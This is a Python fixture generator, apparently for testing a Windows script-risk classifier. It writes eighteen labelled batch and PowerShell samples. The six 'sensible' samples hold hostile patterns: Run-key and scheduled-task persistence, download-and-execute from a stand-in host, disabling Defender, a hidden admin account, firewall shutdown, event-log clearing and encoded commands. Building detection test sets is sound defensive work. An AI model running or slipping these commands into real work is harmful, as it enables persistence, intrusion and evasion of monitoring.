"""Genera el conjunto de evaluación «realista» (18 scripts escritos a mano).

Los scripts se guardan como .txt para que un doble clic los abra en el Bloc de
notas y nunca en CMD o PowerShell (medida de seguridad del proyecto original).
Etiquetado: una sola persona (el autor) según la guía de clases; el acuerdo
entre dos etiquetadores (kappa de Cohen) queda pendiente.

Ejecutar: .venv\\Scripts\\python tests\\fixtures\\scripts_reales\\crear_fixtures.py
"""

import csv
from pathlib import Path

HERE = Path(__file__).parent

SCRIPTS = {
    # ---------------------------- consulta ----------------------------------
    ("inventario_equipo.bat.txt", "consulta"): r"""@echo off
chcp 65001 >nul
title Inventario del equipo
echo ===== Inventario %COMPUTERNAME% =====
hostname
ver
systeminfo | findstr /B /C:"Nombre del sistema operativo" /C:"Memoria fisica total"
wmic cpu get name
wmic logicaldisk get caption,freespace,size
ipconfig | findstr IPv4
pause
""",
    ("diagnostico_red.cmd.txt", "consulta"): r"""@echo off
setlocal
echo Diagnostico de red - %DATE% %TIME%
ipconfig /all
ping -n 4 8.8.8.8
tracert -d -h 10 www.unicesar.edu.co
nslookup www.unicesar.edu.co
netstat -ano | findstr ESTABLISHED
endlocal
""",
    ("estado_servicios.ps1.txt", "consulta"): r"""param([int]$Top = 10)
# Muestra los servicios y procesos que mas memoria usan
Get-Service | Where-Object { $_.Status -eq 'Running' } | Sort-Object DisplayName | Format-Table -AutoSize
Get-Process | Sort-Object WorkingSet64 -Descending | Select-Object -First $Top Name, Id, @{n='MB';e={[math]::Round($_.WorkingSet64/1MB)}}
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, LastBootUpTime
Write-Host "Consulta terminada"
""",
    ("espacio_disco.ps1.txt", "consulta"): r"""$umbral = 15
foreach ($v in Get-Volume | Where-Object DriveLetter) {
    $libre = [math]::Round($v.SizeRemaining / $v.Size * 100, 1)
    if ($libre -lt $umbral) { Write-Warning "Unidad $($v.DriveLetter): solo $libre % libre" }
    else { Write-Host "Unidad $($v.DriveLetter): $libre % libre" }
}
""",
    ("usuarios_sesion.bat.txt", "consulta"): r"""@echo off
whoami
whoami /groups
query user
net user %USERNAME%
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
tasklist /v | findstr /i "%USERNAME%"
""",
    ("revisar_eventos.ps1.txt", "consulta"): r"""try {
    Get-WinEvent -FilterHashtable @{LogName='System'; Level=2; StartTime=(Get-Date).AddDays(-1)} -MaxEvents 20 |
        Select-Object TimeCreated, ProviderName, Id | Format-Table
} catch {
    Write-Host "No fue posible leer el registro: $_"
}
""",
    # ---------------------------- modifica ----------------------------------
    ("respaldo_documentos.bat.txt", "modifica"): r"""@echo off
set ORIGEN=%USERPROFILE%\Documents\Universidad
set DESTINO=D:\Respaldos\%DATE:~-4%-%DATE:~3,2%-%DATE:~0,2%
if not exist "%DESTINO%" mkdir "%DESTINO%"
robocopy "%ORIGEN%" "%DESTINO%" /E /R:1 /W:1 /LOG:"%DESTINO%\respaldo.log"
echo Respaldo terminado >> "%DESTINO%\respaldo.log"
""",
    ("informe_auditoria.cmd.txt", "modifica"): r"""@echo off
md C:\Auditoria 2>nul
systeminfo > C:\Auditoria\sistema.txt
tasklist > C:\Auditoria\procesos.txt
ipconfig /all > C:\Auditoria\red.txt
echo Informe generado el %DATE% >> C:\Auditoria\resumen.txt
""",
    ("exportar_inventario.ps1.txt", "modifica"): r"""$destino = Join-Path $env:USERPROFILE 'Desktop\inventario'
New-Item -ItemType Directory -Path $destino -Force | Out-Null
Get-Process | Select-Object Name, Id, CPU | Export-Csv "$destino\procesos.csv" -NoTypeInformation
Get-Service | Export-Csv "$destino\servicios.csv" -NoTypeInformation
Get-ComputerInfo | Out-File "$destino\equipo.txt"
""",
    ("preferencias_app.ps1.txt", "modifica"): r"""$ruta = 'HKCU:\Software\MiAplicacion'
if (-not (Test-Path $ruta)) { New-Item -Path $ruta -Force | Out-Null }
Set-ItemProperty -Path $ruta -Name Tema -Value 'oscuro'
Set-ItemProperty -Path $ruta -Name Idioma -Value 'es-CO'
Write-Host 'Preferencias guardadas'
""",
    ("organizar_descargas.ps1.txt", "modifica"): r"""$descargas = Join-Path $env:USERPROFILE 'Downloads'
foreach ($ext in 'pdf','docx','zip') {
    $carpeta = Join-Path $descargas $ext
    New-Item -ItemType Directory -Path $carpeta -Force | Out-Null
    Get-ChildItem $descargas -Filter "*.$ext" -File | Move-Item -Destination $carpeta
}
""",
    ("copiar_proyecto.bat.txt", "modifica"): r"""@echo off
xcopy "C:\Proyectos\EcoAccess" "E:\USB\EcoAccess" /E /I /Y
copy /Y "C:\Proyectos\notas.txt" "E:\USB\"
echo Copia lista
""",
    # ---------------------------- sensible ----------------------------------
    ("actualizador_falso.bat.txt", "sensible"): r"""@echo off
copy /Y "%~f0" "%APPDATA%\winupdate.bat" >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /t REG_SZ /d "%APPDATA%\winupdate.bat" /f
attrib +h +s "%APPDATA%\winupdate.bat"
:BUCLE
tasklist > "%TEMP%\t.txt"
timeout /t 60 >nul
goto BUCLE
""",
    ("limpieza_agresiva.cmd.txt", "sensible"): r"""@echo off
taskkill /f /im chrome.exe
taskkill /f /im msedge.exe
rd /s /q "%LOCALAPPDATA%\Temp"
del /f /s /q C:\Windows\Prefetch\*.*
wevtutil cl System
wevtutil cl Application
""",
    ("descargar_y_ejecutar.ps1.txt", "sensible"): r"""$u = 'https://servidor.invalid/actualizacion.ps1'
$c = (New-Object Net.WebClient).DownloadString($u)
Invoke-Expression $c
Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile -File C:\Users\Public\a.ps1'
""",
    ("tarea_persistente.ps1.txt", "sensible"): r"""$accion = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -File C:\ProgramData\svc.ps1'
$disparador = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName 'OneDrive Sync Helper' -Action $accion -Trigger $disparador
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath 'C:\ProgramData'
""",
    ("cuenta_oculta.bat.txt", "sensible"): r"""@echo off
net user soporte P4ssw0rd! /add
net localgroup administradores soporte /add
net share publico=C:\ /grant:todos,full
netsh advfirewall set allprofiles state off
""",
    ("ofuscado.ps1.txt", "sensible"): r"""$a = 'In' + 'voke-Ex' + 'pression'
$b = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAC0ASABvAHMAdAAgAGgAbwBsAGEA'))
& $a $b
powershell -NoP -W Hidden -enc VwByAGkAdABlAC0ASABvAHMAdAAgAGgAbwBsAGEA
""",
}


def main() -> None:
    with open(HERE / "etiquetas.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["archivo", "etiqueta", "origen"])
        for (name, label), text in SCRIPTS.items():
            (HERE / name).write_text(text, encoding="utf-8")
            w.writerow([name, label, "realista_autor"])
    print(f"{len(SCRIPTS)} scripts escritos en {HERE}")


if __name__ == "__main__":
    main()
